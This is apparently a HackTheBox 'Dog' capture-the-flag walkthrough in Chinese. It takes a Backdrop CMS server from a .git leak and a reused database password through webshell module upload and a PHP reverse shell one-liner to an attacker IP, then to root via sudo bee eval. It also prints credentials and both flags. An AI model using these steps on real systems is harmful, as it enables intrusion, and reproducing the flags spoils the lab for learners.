# Dog

:::info

Difficulty: Easy

Operating System: Linux

:::

## ENTRY POINT

```plaintext
10.10.11.58
```

## 资产探测

```bash
┌──(randark ㉿ kali)-[~]
└─$ sudo ./tools/fscan-1.8.4/fscan -h 10.10.11.58

start infoscan
10.10.11.58:80 open
10.10.11.58:22 open
[*] alive ports len is: 2
start vulscan
[*] WebTitle http://10.10.11.58        code:200 len:13332  title:Home | Dog
[+] InfoScan http://10.10.11.58        [CMS]

┌──(randark ㉿ kali)-[~]
└─$ sudo nmap -v --min-rate=2000 -A -p- 10.10.11.58
Nmap scan report for bogon (10.10.11.58)
Host is up (0.14s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Home | Dog
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-git:
|   10.10.11.58:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin
| /comment/reply /filter/tips /node/add /search /user/register
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
```

## Port 80 Web Service

尝试直接访问

![img](img/image_20250353-085334.png)

在页面底部发现指纹信息 `Powered by Backdrop CMS` 也就是 [Backdrop CMS](https://backdropcms.org/) CMS 框架

发现网站存在有 `.git` 信息泄露，尝试将 git 储存库 dump 到本地

```bash
┌──(randark ㉿ kali)-[~/tmp]
└─$ perl ~/tools/dvcs-ripper-master/rip-git.pl -v -u http://10.10.11.58/.git/
[i] Downloading git files from http://10.10.11.58/.git/
[i] Auto-detecting 404 as 200 with 3 requests
[i] Getting correct 404 responses
[i] Using session name: KELTxFzt
[d] found COMMIT_EDITMSG
[d] found config
[d] found description
[d] found HEAD
[d] found index
[!] Not found for packed-refs: 404 Not Found
[!] Not found for objects/info/alternates: 404 Not Found
[!] Not found for info/grafts: 404 Not Found
[d] found logs/HEAD
[d] found objects/82/04779c764abd4c9d8d95038b6d22b6a7515afa
[d] found refs/heads/master
[i] Running git fsck to check for missing items
......
```

经过漫长的等待，终于得到了整个泄露的 git 储存库

![img](img/image_20250304-150416.png)

并在其中找到了用户名信息

```plaintext title="/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json"
tiffany@dog.htb
```

```plaintext title="/settings.php"
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
```

在网站的用户登录界面 `http://10.10.11.58/?q=user/login` 成功使用凭据 `tiffany@dog.htb:BackDropJ2024DS2024` 进行登录

![img](img/image_20250308-150804.png)

![img](img/image_20250308-150816.png)

在 `http://10.10.11.58/?q=admin/modules/install` 中，找到了模块的安装功能点

参考 [Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE)](https://www.exploit-db.com/exploits/52021)

需要打包一个包含有恶意模块的 tar 包，而不是 zip 包，因为 CMS 暂未添加有 zip 模块

```bash
┌──(env)(randark ㉿ kali)-[~/tmp]
└─$ python3 test-01.py http://10.10.11.58
Backdrop CMS 1.27.1 - Remote Command Execution Exploit
Evil module generating...
Evil module generated! shell.zip
Go to http://10.10.11.58/admin/modules/install and upload the shell.zip for Manual Installation.
Your shell address: http://10.10.11.58/modules/shell/shell.php

┌──(env)(randark ㉿ kali)-[~/tmp]
└─$ tar czf shell.tar shell
```

然后上传打包好的 tar 包

![img](img/image_20250316-151652.png)

而后在 `http://10.10.11.58/modules/shell/` 就可以发现上传好的恶意模块

![img](img/image_20250318-151813.png)

尝试进行利用

![img](img/image_20250318-151847.png)

利用成功，考虑反弹 shell

## 反弹 shell

使用 webshell 执行以下命令

```bash
php -r '$sock=fsockopen("10.10.16.31",9999);exec("bash <&3 >&3 2>&3");'
```

成功收到回连的会话

```bash
┌──(randark ㉿ kali)-[~]
└─$ pwncat-cs -lp 9999
[15:19:44] Welcome to pwncat 🐈!
[15:21:04] received connection from 10.10.11.58:56674
[15:21:07] 10.10.11.58:56674: registered new host w/ db
(local) pwncat$ back
(remote) www-data@dog:/var/www/html/modules/shell$ whoami
www-data
```

## 现有凭据转移至 johncusack

发现正常权限用户两个

```bash
(remote) www-data@dog:/var/www/html/modules/shell$ ls -lh /home/
total 8.0K
drwxr-xr-x 4 jobert     jobert     4.0K Feb  7 15:59 jobert
drwxr-xr-x 3 johncusack johncusack 4.0K Feb  7 15:59 johncusack
```

尝试上文发现的 mysql 数据库凭据，发现可以登录 johncusack

```bash
(remote) www-data@dog:/var/www/html/modules/shell$ su johncusack
Password:
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
sh: 0: getcwd() failed: No such file or directory
johncusack@dog:/var/www/html/modules/shell$
```

## FLAG - USER

```flag title="/home/johncusack/user.txt"
e7ea764890f7ab52949fe7cdbaad87b5
```

## 提权至 root

在 sudo 配置信息中可以发现

```bash
johncusack@dog:~$ sudo -l
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee

johncusack@dog:~$ file /usr/local/bin/bee
/usr/local/bin/bee: symbolic link to /backdrop_tool/bee/bee.php
```

查看 php 源代码

```php title="/backdrop_tool/bee/bee.php"
#!/usr/bin/env php
<?php
/**
 * @file
 * A command line utility for Backdrop CMS.
 */

// Exit gracefully with a meaningful message if installed within a web
// accessible location and accessed in the browser.
if (!bee_is_cli()) {
    echo bee_browser_load_html();
    die();
}

// Set custom error handler.
set_error_handler('bee_error_handler');

// Include files.
require_once __DIR__ . '/includes/miscellaneous.inc';
require_once __DIR__ . '/includes/command.inc';
require_once __DIR__ . '/includes/render.inc';
require_once __DIR__ . '/includes/filesystem.inc';
require_once __DIR__ . '/includes/input.inc';
require_once __DIR__ . '/includes/globals.inc';

// Main execution code.
bee_initialize_server();
bee_parse_input();
bee_initialize_console();
bee_process_command();
bee_print_messages();
bee_display_output();
exit();

/**
 * Custom error handler for `bee`.
 *
 * @param int $error_level
 *   The level of the error.
 * @param string $message
 *   Error message to output to the user.
 * @param string $filename
 *   The file that the error came from.
 * @param int $line
 *   The line number the error came from.
 * @param array $context
 *   An array of all variables from where the error was triggered.
 *
 * @see https://www.php.net/manual/en/function.set-error-handler.php
 * @see _backdrop_error_handler()
 */
function bee_error_handler($error_level, $message, $filename, $line, array $context = NULL) {
    require_once __DIR__ . '/includes/errors.inc';
    _bee_error_handler_real($error_level, $message, $filename, $line, $context);
}

/**
 * Detects whether the current script is running in a command-line environment.
 */
function bee_is_cli() {
    return (empty($_SERVER['SERVER_SOFTWARE']) && (php_sapi_name() == 'cli' || (is_numeric($_SERVER['argc']) && $_SERVER['argc'] > 0)));
}

/**
 * Return the HTML to display if this page is loaded in the browser.
 *
 * @return string
 *   The concatentated html to display.
 */
function bee_browser_load_html() {
    // Set the title to use in h1 and title elements.
    $title = "Bee Gone!";
    // Place a white block over "#!/usr/bin/env php" as this is output before
    // anything else.
    $browser_output = "<div style='background-color:white;position:absolute;width:15rem;height:3rem;top:0;left:0;z-index:9;'>&nbsp;</div>";
    // Add the bee logo and style appropriately.
    $browser_output .= "<img src='./images/bee.png'align='right'width='150'height='157'style='max-width:100%;margin-top:3rem;'>";
    // Add meaningful text.
    $browser_output .= "<h1 style='font-family:Tahoma;'>$title</h1>";
    $browser_output .= "<p style='font-family:Verdana;'>Bee is a command line tool only and will not work in the browser.</p>";
    // Add the document title using javascript when the window loads.
    $browser_output .= "<script>window.onload = function(){document.title='$title';}</script>";
    // Output the combined string.
    return $browser_output;
}
```

经过代码分析，可以尝试使用 `eval` 函数实现任意命令执行

```bash
johncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('whoami')"
root
```

## FLAG - ROOT

```flag title="/root/root.txt"
3fe5fde91fa680a9a6e062ba9a80cb50
```

## 📚 Fuentes / Sources

- Autor notas: Apuromafo.

---

## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de contenido activo.
> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish active content flags.

_Fecha de edición: 2026-09-26_
